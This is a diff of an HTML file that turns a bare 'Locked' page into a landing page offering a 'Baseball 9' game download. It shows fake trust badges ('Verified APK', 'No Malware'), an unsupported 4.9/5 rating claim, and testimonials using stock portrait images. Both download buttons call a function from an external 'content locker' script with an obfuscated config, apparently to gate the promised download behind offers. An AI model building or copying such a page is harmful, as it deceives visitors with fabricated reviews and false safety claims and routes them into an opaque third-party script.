@@ -1,13 +1,332 @@
+<!DOCTYPE html>
+<html lang="en">
 <head>
-    <title>Locked</title>
-    <link rel="shortcut icon" type="image/png"
-          href="https://d39fkvblvwpxa1.cloudfront.net/uploads/148610538813e3841abb038f03fc52ba35efd9167f.png"/>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<script type="text/javascript">
-    var blxEX_dXR_vowmec={"it":4533454,"key":"75a39"};
-</script>
-<script src="https://dfmpe7igjx4jo.cloudfront.net/d3562af.js"></script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Baseball 9 </title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+  <style>
+    body {
+      background: linear-gradient(135deg, #0554e8 30%, #9205e8 70%);
+      color: #FFFFFF;
+      font-family: 'Poppins', sans-serif;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      max-width: 800px;
+      margin: 0 auto;
+      padding: 20px;
+    }
+    .title {
+      text-align: center;
+      font-size: 32px;
+      font-weight: 700;
+      background: linear-gradient(90deg, #60a5fa, #34d399);
+      -webkit-background-clip: text;
+      color: transparent;
+    }
+    .subtitle {
+      text-align: center;
+      color: #cbd5e1;
+      font-size: 16px;
+      margin-bottom: 20px;
+      font-weight: bold;
+    }
+    .trustbar {
+      display: flex;
+      justify-content: space-around;
+      align-items: center;
+      background: rgba(255,255,255,0.05);
+      border: 1px solid rgba(255,255,255,0.1);
+      border-radius: 10px;
+      padding: 12px;
+      margin: 20px 0;
+      backdrop-filter: blur(6px);
+      font-weight: bold;
+    }
+    .trustbar i {
+      font-size: 18px;
+      color: #34d399;
+      margin-right: 8px;
+    }
+    .trustbar span {
+      color: #f1f5f9;
+      font-size: 14px;
+    }
+    .card {
+      background: rgba(255,255,255,0.05);
+      padding: 20px;
+      border-radius: 12px;
+      margin-top: 20px;
+      font-weight: bold;
+    }
+    .game-image {
+      width: 100px;
+      height: 100px;
+      margin: 0 auto;
+      display: block;
+      border-radius: 16px;
+    }
+    .btn-container {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      margin-top: 20px;
+    }
+    .btn {
+      background: linear-gradient(90deg, #10b981, #059669);
+      color: white;
+      padding: 12px;
+      border-radius: 10px;
+      text-align: center;
+      text-decoration: none;
+      font-weight: bold;
+      cursor: pointer;
+      border: none;
+      font-size: 16px;
+    }
+    .btn-apple {
+      background: linear-gradient(90deg, #3b82f6, #2563eb);
+    }
+    .slideshow-container {
+      position: relative;
+      margin: 30px 0;
+      border-radius: 12px;
+      overflow: hidden;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
+      background: rgba(255,255,255,0.05);
+    }
+    .slide {
+      display: none;
+      position: relative;
+    }
+    .slide.active {
+      display: block;
+    }
+    .slide img {
+      width: 100%;
+      height: 200px;
+      object-fit: cover;
+      border-radius: 12px;
+    }
+    .slide-content {
+      position: absolute;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      background: linear-gradient(transparent, rgba(0,0,0,0.8));
+      padding: 20px;
+      color: white;
+    }
+    .slide-title {
+      font-size: 18px;
+      font-weight: bold;
+      margin-bottom: 5px;
+    }
+    .slide-description {
+      font-size: 14px;
+      opacity: 0.9;
+    }
+    .prev, .next {
+      position: absolute;
+      top: 50%;
+      transform: translateY(-50%);
+      background: rgba(0,0,0,0.5);
+      color: white;
+      border: none;
+      padding: 15px 20px;
+      cursor: pointer;
+      font-size: 18px;
+      border-radius: 0 5px 5px 0;
+      transition: background 0.3s;
+    }
+    .prev {
+      left: 0;
+      border-radius: 0 5px 5px 0;
+    }
+    .next {
+      right: 0;
+      border-radius: 5px 0 0 5px;
+    }
+    .prev:hover, .next:hover {
+      background: rgba(0,0,0,0.8);
+    }
+    .dots-container {
+      text-align: center;
+      padding: 20px 0;
+    }
+    .dot {
+      cursor: pointer;
+      height: 15px;
+      width: 15px;
+      margin: 0 5px;
+      background-color: rgba(255,255,255,0.3);
+      border-radius: 50%;
+      display: inline-block;
+      transition: background-color 0.3s;
+    }
+    .dot.active, .dot:hover {
+      background-color: #60a5fa;
+    }
+    .reviews {
+      margin: 40px 0;
+    }
+    .review {
+      background: rgba(255,255,255,0.05);
+      border-radius: 10px;
+      padding: 12px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 15px;
+      font-weight: bold;
+    }
+    .review img {
+      width: 48px;
+      height: 48px;
+      border-radius: 50%;
+    }
+    .review-text {
+      color: #f8fafc;
+      font-size: 14px;
+    }
+    .legal {
+      font-size: 11px;
+      color: #94a3b8;
+      text-align: center;
+      margin-top: 40px;
+      font-weight: bold;
+    }
+    .legal a {
+      color: #60a5fa;
+      text-decoration: underline;
+    }
+  </style>
 </head>
-<body style="background: #a0a0a0;">
-<script>_wg();</script>
-</body>
+<body>
+  <div class="container">
+    <h1 class="title">BaseBall 9</h1>
+    
+    <div class="trustbar">
+      <div><i class="fas fa-lock"></i><span> Secure Download</span></div>
+      <div><i class="fas fa-check-circle"></i><span> Verified APK</span></div>
+      <div><i class="fas fa-shield-alt"></i><span> No Malware</span></div>
+    </div>
+
+    <div class="card">
+      <img src="https://play-lh.googleusercontent.com/Y9GghCslNNk-nWccWvxgCDYvd7yLSwkw0hZ3NVTkSJqigY0ZozK3lv85jR02XOJSDPQ=w240-h480-rw" alt="baseball 9 Game" class="game-image">
+      <p style="text-align:center; margin-top: 15px; font-weight: bold;">⭐ 4.9/5 rating based on 159,000+ reviews</p>
+      <p style="text-align:center; color: #fcd34d; font-weight: bold;"></p>
+
+      <div class="btn-container">
+        <button class="btn" onclick="_bu()">Download for Android</button>
+        <button class="btn btn-apple" onclick="_bu()">Download for iOS</button>
+      </div>
+    </div>
+
+    <div class="slideshow-container">
+      <div class="slide active">
+        <img src="https://i.postimg.cc/T1G7MtgM/Whats-App-Image-2025-05-30-at-17-44-33-a88a4be5.jpg" alt="Gameplay Screenshot 1">
+        <div class="slide-content">
+          <div class="slide-title"></div>
+          <div class="slide-description"></div>
+        </div>
+      </div>
+      <div class="slide">
+        <img src="https://i.postimg.cc/SNSTgtmc/Whats-App-Image-2025-05-30-at-17-38-03-9f5d052d.jpg" alt="Gameplay Screenshot 2">
+        <div class="slide-content">
+          <div class="slide-title"></div>
+          <div class="slide-description"></div>
+        </div>
+      </div>
+      <div class="slide">
+        <img src="https://i.postimg.cc/rwzhk00m/Whats-App-Image-2025-05-30-at-17-44-32-36c1b485.jpg" alt="Gameplay Screenshot 3">
+        <div class="slide-content">
+          <div class="slide-title"></div>
+          <div class="slide-description"></div>
+        </div>
+      </div>
+      <div class="slide">
+        <img src="https://i.postimg.cc/26NTh0Hb/Whats-App-Image-2025-05-30-at-17-38-03-72b6a9d6.jpg" alt="Gameplay Screenshot 4">
+        <div class="slide-content">
+          <div class="slide-title"></div>
+          <div class="slide-description"></div>
+        </div>
+      </div>
+      
+      <button class="prev" onclick="changeSlide(-1)">&#10094;</button>
+      <button class="next" onclick="changeSlide(1)">&#10095;</button>
+    </div>
+
+    <div class="dots-container">
+      <span class="dot active" onclick="currentSlide(1)"></span>
+      <span class="dot" onclick="currentSlide(2)"></span>
+      <span class="dot" onclick="currentSlide(3)"></span>
+      <span class="dot" onclick="currentSlide(4)"></span>
+    </div>
+
+    <div class="reviews">
+      <div class="review">
+        <img src="https://randomuser.me/api/portraits/men/32.jpg" alt="User 1">
+        <div class="review-text">"I downloaded it thinking it was fake, but this game is 🔥! Totally worth the hype."</div>
+      </div>
+      <div class="review">
+        <img src="https://randomuser.me/api/portraits/women/45.jpg" alt="User 2">
+        <div class="review-text">"Super smooth gameplay and offline mode actually works — love it!"</div>
+      </div>
+      <div class="review">
+        <img src="https://randomuser.me/api/portraits/men/77.jpg" alt="User 3">
+        <div class="review-text">"No ads, no lag, just pure baseball chaos. 10/10."</div>
+      </div>
+    </div>
+
+    <div class="legal">
+      <p>Disclaimer: This is a fan-made landing page for promotional purposes only. We are not affiliated with the developers of Baseball 9. All content is for entertainment and marketing use.</p>
+      <p><a href="#">Privacy Policy</a> | <a href="#">Terms of Use</a></p>
+    </div>
+  </div>
+
+  <!-- Slideshow JavaScript -->
+  <script>
+    let slideIndex = 1;
+    showSlide(slideIndex);
+
+    function changeSlide(n) {
+      showSlide(slideIndex += n);
+    }
+
+    function currentSlide(n) {
+      showSlide(slideIndex = n);
+    }
+
+    function showSlide(n) {
+      let slides = document.getElementsByClassName("slide");
+      let dots = document.getElementsByClassName("dot");
+      
+      if (n > slides.length) {slideIndex = 1}
+      if (n < 1) {slideIndex = slides.length}
+      
+      for (let i = 0; i < slides.length; i++) {
+        slides[i].classList.remove("active");
+      }
+      
+      for (let i = 0; i < dots.length; i++) {
+        dots[i].classList.remove("active");
+      }
+      
+      slides[slideIndex-1].classList.add("active");
+      dots[slideIndex-1].classList.add("active");
+    }
+
+    // Auto-advance slides every 5 seconds
+    setInterval(function() {
+      changeSlide(1);
+    }, 5000);
+  </script>
+
+  <!-- Content Locker Scripts -->
+<script type="text/javascript">
+    var TFEDQ_ywu_ADJbdc={"it":4543012,"key":"36cd4"};
+</script>
+<script src="https://dfmpe7igjx4jo.cloudfront.net/1ac942e.js"></script>
